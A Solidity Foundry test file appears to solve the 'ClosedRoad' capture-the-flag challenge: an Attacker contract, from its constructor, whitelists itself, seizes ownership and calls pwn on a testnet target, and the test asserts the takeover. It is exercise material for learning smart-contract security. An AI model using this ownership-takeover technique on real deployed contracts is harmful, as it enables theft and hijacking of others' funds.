// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "forge-std/console.sol";


/**
    Objective of CTF :: ClosedRoad
    1. Become the owner of the contract
    2. Change the value of hacked to true
*/


contract Attacker {
    constructor(address _target) public {
        IRoadClosed(_target).addToWhitelist(address(this));
        IRoadClosed(_target).changeOwner(address(this));
        IRoadClosed(_target).pwn(address(this));
    }
}



contract ClosedRoadHack is Test {
    
    IRoadClosed _target = IRoadClosed(0xD2372EB76C559586bE0745914e9538C17878E812);
    Attacker _attacker;


    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth_goerli");
        _attacker = new Attacker(address(_target));
    }
    
    
    function test_ClosedRoadAttack() public {
        // Check if the contract is hacked
        assertEq(_target.isHacked(), true);
        vm.startPrank(address(_attacker));
        // Verify the attacker is recognized as the owner
        assertEq(_target.isOwner(), true, "Owner check failed for attacker address");    
    }

}

   interface IRoadClosed {
    function addToWhitelist(address addr) external;

    function changeOwner(address addr) external;

    function isContract(address addr) external view returns (bool);

    function isHacked() external view returns (bool);

    function isOwner() external view returns (bool);

    function pwn(address addr) external payable;

    function pwn() external payable;
}


    

